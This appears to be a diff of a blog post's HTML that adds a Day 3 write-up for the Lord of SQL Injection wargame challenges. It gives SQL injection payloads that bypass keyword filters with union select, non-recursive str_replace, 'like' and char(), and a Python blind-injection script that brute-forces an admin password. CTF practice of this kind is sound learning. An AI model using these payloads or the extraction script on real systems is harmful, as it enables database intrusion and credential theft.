@@ -53,7 +53,7 @@ id=&#39;or(1)--&#43;- # ... where id=&#39;&#39; or(1)-- &#43;-and pw= id=1&#39; 
   <title>clock</title>
   <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
 </svg>
-          4 min read
+          5 min read
         </div>
       </div>
     </header>
@@ -79,7 +79,7 @@ id=&#39;or(1)--&#43;- # ... where id=&#39;&#39; or(1)-- &#43;-and pw= id=1&#39; 
 <p>Focus the php code below:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select id from prob_cobolt where id=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">id</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; and pw=md5(&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">pw</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)&#34;</span>; 
 <span style="color:#66d9ef">if</span>($result[<span style="color:#e6db74">&#39;id&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;admin&#39;</span>) <span style="color:#a6e22e">solve</span>(<span style="color:#e6db74">&#34;cobolt&#34;</span>);
-</code></pre></div><p>Clearly <code>union select</code> is a good choice to control value return from id</p>
+</code></pre></div><p>Clearly <code>union select</code> is a good choice to control value return from id, so the payload look like this:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">    id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#75715e">-- and pw=md5(&#39;&#39;) Here id will return &#34;admin&#34; because &#34;pw&#34; is commented
 </span></code></pre></div><h3 id="goblin">Goblin</h3>
 <p>Focus the php code below:</p>
@@ -176,13 +176,67 @@ With <code>space</code> we can replace by comment syntax <code>/**/</code></p>
 </code></pre></div><h3 id="darkelf">darkelf</h3>
 <p>Nothing special filter, continue use <code>wolfman</code> payload</p>
 <h3 id="orge">orge</h3>
-<p>It same to <code>orc</code> challenge, author add filters <code>or</code>,<code>and</code>.
+<p>It same to <a href="#orc">orc</a> challenge, author add filters <code>or</code>,<code>and</code>.
 we just need replace <code>or</code> with <code>||</code> and <code>and</code> with <code>&amp;&amp;</code></p>
 <h3 id="troll">troll</h3>
 <p>Easy challenge :)), notice that pattern of <code>preg_match</code> is not have flag <code>i</code> (case insensitive).
 It means we can use &lsquo;Admin&rsquo; instead of &lsquo;admin&rsquo;</p>
 <pre tabindex="0"><code>?id=Admin
-</code></pre>
+</code></pre><hr>
+<h2 id="day-3">Day 3</h2>
+<ul>
+<li>vampire</li>
+<li>skeleton</li>
+<li>golem</li>
+<li>darkknight</li>
+</ul>
+<h3 id="vampire">vampire</h3>
+<p>I wake up at 6 o&rsquo;clock and feel so full of energy, have breakfast and play CTF :)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,$_GET[<span style="color:#a6e22e">id</span>]);
+</code></pre></div><p>This chall replace &lsquo;admin&rsquo; string, it not hard to bypass it.
+Because <code>str_replace</code> function is not recursive, so you can write <code>adadminmin</code>, and when it replace <code>admin</code> it becomes to <code>ad</code>admin<code>min</code>.</p>
+<p>So the payload will be:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span>adadminmin
+</code></pre></div><h3 id="skeleton">skeleton</h3>
+<p>Use <a href="#cobolt">Cobolt</a> payload</p>
+<h3 id="golem">golem</h3>
+<p>Use <a href="#orc">orc</a> idea, but replace <code>or</code> by <code>||</code>; <code>and</code> by <code>&amp;&amp;</code>.
+Author add filter <code>substr</code> and <code>=</code> so i think a couple of hours, i found <code>like</code> is useful to replace <code>=</code>.</p>
+<p>Nice, but how use it?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">select</span> id <span style="color:#66d9ef">from</span> prob_golem <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#66d9ef">and</span> pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">||</span> id <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#f92672">&amp;&amp;</span> pw <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;%&#39;</span>
+<span style="color:#75715e">-- return hello admin
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">select</span> id <span style="color:#66d9ef">from</span> prob_golem <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#66d9ef">and</span> pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">||</span> id <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#f92672">&amp;&amp;</span> pw <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;7%&#39;</span>
+<span style="color:#75715e">-- return hello admin
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">select</span> id <span style="color:#66d9ef">from</span> prob_golem <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#66d9ef">and</span> pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">||</span> id <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#f92672">&amp;&amp;</span> pw <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;7a%&#39;</span>
+<span style="color:#75715e">-- return not anything
+</span></code></pre></div><p>My code to solve this challenge:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> string
+
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php&#34;</span>
+<span style="color:#75715e"># ?pw=&#39; || (id like (&#39;admin&#39;) &amp;&amp; length(pw) &gt; 8) || &#39; -- I extract length of pw is 8</span>
+pw <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+session <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;qckem3eou6njaopue0repj1g4l&#39;</span>
+cookie <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#39;PHPSESSID&#39;</span> : <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>session<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>}
+req <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">9</span>):
+    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>ascii_lowercase:
+        payload <span style="color:#f92672">=</span> {
+            <span style="color:#e6db74">&#34;pw&#34;</span> : <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#39; || id like &#39;admin&#39; &amp;&amp; pw like &#39;</span><span style="color:#e6db74">{</span>pw<span style="color:#f92672">+</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">%&#34;</span>
+        }
+        r <span style="color:#f92672">=</span> req<span style="color:#f92672">.</span>get(url, params<span style="color:#f92672">=</span>payload, cookies<span style="color:#f92672">=</span>cookie)
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Hello admin&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
+            pw <span style="color:#f92672">+=</span> c
+            print(pw)
+            <span style="color:#66d9ef">break</span>
+</code></pre></div><h3 id="darkknight">darkknight</h3>
+<p>Use <a href="#golem">golem</a> payload.
+i replace <code>''</code> by <code>char()</code> , <code>substring()</code> by <code>left()</code>.</p>
+<p>Many ways, huh!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span>(id <span style="color:#66d9ef">like</span> char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">left</span>(pw,<span style="color:#ae81ff">8</span>) <span style="color:#66d9ef">like</span> char(<span style="color:#ae81ff">48</span>,<span style="color:#ae81ff">98</span>,<span style="color:#ae81ff">55</span>,<span style="color:#ae81ff">48</span>,<span style="color:#ae81ff">101</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">102</span>))
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">   <span style="color:#f92672">=&gt;</span> pw <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>b70ea1f
+</code></pre></div>
     </div>
     <div class="post-footer">
       
